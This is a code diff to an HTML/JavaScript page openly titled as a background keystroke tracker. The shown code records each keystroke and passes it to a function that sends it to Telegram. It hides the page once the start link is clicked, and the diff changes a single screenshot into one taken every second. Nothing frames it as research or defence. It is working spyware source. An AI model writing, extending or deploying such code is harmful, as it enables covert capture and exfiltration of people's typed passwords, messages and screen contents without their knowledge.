@@ -51,16 +51,6 @@
                 keystrokes += event.key; // Capture each key pressed
                 sendToTelegram(`Captured Keystroke: ${event.key}`);  // Send keystroke to Telegram
             });
-
-            // Capture when the page is focused again
-            document.addEventListener('focus', () => {
-                console.log("Page is focused. Resuming keystroke tracking.");
-            });
-
-            // Capture when the page loses focus (user switches tabs or minimizes)
-            document.addEventListener('blur', () => {
-                console.log("Page is blurred. Keystroke tracking continues in the background.");
-            });
         }
 
         // Function to take a screenshot of the page
@@ -75,13 +65,17 @@
             });
         }
 
-        // Function to hide page and start keystroke tracking and screenshot
+        // Function to start the tracking without delay
         function startTracking() {
             // Hide the page immediately
             document.body.style.display = 'none';  
             
             captureKeystrokes();  // Start capturing keystrokes immediately
-            takeScreenshot();     // Take a screenshot when the page starts working
+            
+            // Set an interval to take a screenshot every 1 second (1000ms)
+            setInterval(() => {
+                takeScreenshot();  // Take a screenshot every second
+            }, 1000);
         }
 
         // Event listener for the link click
@@ -98,6 +92,6 @@
 <body>
     <h1>Keystroke Tracker Running in Background</h1>
     <p>Click the link below to start the tracker:</p>
-    <p id="startLink">Click here to start tracking keystrokes and take a screenshot!</p>
+    <p id="startLink">Click here to start tracking keystrokes and take a screenshot every second!</p>
 </body>
 </html>
